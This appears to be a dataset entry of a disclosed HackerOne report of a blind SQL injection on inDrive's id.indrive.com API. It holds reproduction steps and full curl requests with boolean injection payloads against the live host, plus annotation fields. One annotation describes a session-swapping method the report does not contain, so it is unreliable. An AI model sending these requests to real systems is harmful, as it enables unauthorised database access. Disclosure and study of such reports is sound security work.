{
  "reported_to": "inDrive",
  "reported_by": "kristoferent ",
  "title": "Blind SQL injection on id.indrive.com",
  "content": "\nSummary:\nThe server does not perform sanitization on user input, allowing an attacker to inject arbitrary SQL commands into a query.\nSteps To Reproduce:\nGo to https://promo.indrive.com/10ridestogetprize_ru/random\nClick \"\u0421\u0433\u0435\u043d\u0435\u0440\u0438\u0440\u043e\u0432\u0430\u0442\u044c\". A request to https://id.indrive.com/api/ten-drives/custom-winners/ten_drive_kz_second_weeks/number_trips/29/5/phone will be made:\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n3. Repeat this request, but change the path to:\nCode 88 Bytes\n1/api/ten-drives/custom-winners/ten_drive_kz_second_weeks/number_trips/1/999%20or%201=1--\nA random entry from the database will be returned:\n\u2588\u2588\u2588\u2588\n4. Change the path in a query to:\nCode 88 Bytes\n1/api/ten-drives/custom-winners/ten_drive_kz_second_weeks/number_trips/1/999%20or%201=2--\nThe response from the server will be empty:\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nBoth requests in curl format\nCode 600 Bytes\n1curl -i -s -k -X $'GET' \\\n2    -H $'Host: id.indrive.com' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H $'Accept: application/json, text/plain, */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Origin: https://promo.indrive.com' -H $'Referer: https://promo.indrive.com/' -H $'Sec-Fetch-Dest: empty' -H $'Sec-Fetch-Mode: cors' -H $'Sec-Fetch-Site: same-site' -H $'Te: trailers' -H $'Connection: close' \\\n3    $'https://id.indrive.com/api/ten-drives/custom-winners/ten_drive_kz_second_weeks/number_trips/1/999%20or%201=1--'\nCode 600 Bytes\n1curl -i -s -k -X $'GET' \\\n2    -H $'Host: id.indrive.com' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H $'Accept: application/json, text/plain, */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Origin: https://promo.indrive.com' -H $'Referer: https://promo.indrive.com/' -H $'Sec-Fetch-Dest: empty' -H $'Sec-Fetch-Mode: cors' -H $'Sec-Fetch-Site: same-site' -H $'Te: trailers' -H $'Connection: close' \\\n3    $'https://id.indrive.com/api/ten-drives/custom-winners/ten_drive_kz_second_weeks/number_trips/1/999%20or%201=2--'\nImpact\nThis vulnerability allows attackers to inject any SQL statements into a query.\nFor example, I was able to retrieve the SQL version:\nPostgreSQL 14.8 (Ubuntu 14.8-0ubuntu0.22.04.1)\n\n",
  "severity": [
    9.0,
    10.0
  ],
  "bounty": 4134,
  "weaknesses": [
    "Blind SQL Injection"
  ],
  "screenshots": {},
  "disclosed_date": 1700854620,
  "report_url": "https://hackerone.com/reports/2051931",
  "is_multi_component": false,
  "complexity": "LOW",
  "novelty": "LOW",
  "vuln_category": "API",
  "steps": [
    [
      1,
      "Go to https://promo.indrive.com/10ridestogetprize_ru/random"
    ],
    [
      2,
      "Click \"\u0421\u0433\u0435\u043d\u0435\u0440\u0438\u0440\u043e\u0432\u0430\u0442\u044c\" and observe the request to https://id.indrive.com/api/ten-drives/custom-winners/ten_drive_kz_second_weeks/number_trips/29/5/phone"
    ],
    [
      3,
      "Repeat the request, modifying the path to inject SQL: /api/ten-drives/custom-winners/ten_drive_kz_second_weeks/number_trips/1/999%20or%201=1--"
    ],
    [
      4,
      "Observe the response containing a random database entry"
    ],
    [
      5,
      "Modify the path to /api/ten-drives/custom-winners/ten_drive_kz_second_weeks/number_trips/1/999%20or%201=2--"
    ],
    [
      6,
      "Observe the empty response confirming SQL injection vulnerability"
    ]
  ],
  "vuln_description": "The server does not sanitize user input, allowing SQL injection. Attackers can inject arbitrary SQL commands, demonstrated by retrieving database entries and confirming with conditional logic (1=1 vs 1=2).",
  "reason": "The vulnerability is straightforward to discover using basic SQL injection techniques. The attack involves simple parameter manipulation without complex interactions or state manipulation.",
  "new_complexity": "LOW",
  "requires_code": false,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "injection_metadata": {
    "is_simple_payload": true
  },
  "authnz_metadata": {
    "reason": "The vulnerability involves SQL injection, which is not directly related to authentication or authorization bypass. The methodology described focuses on testing authorization boundaries by swapping user sessions and resource IDs, not on input sanitization or SQL query manipulation.",
    "is_detectable": false
  }
}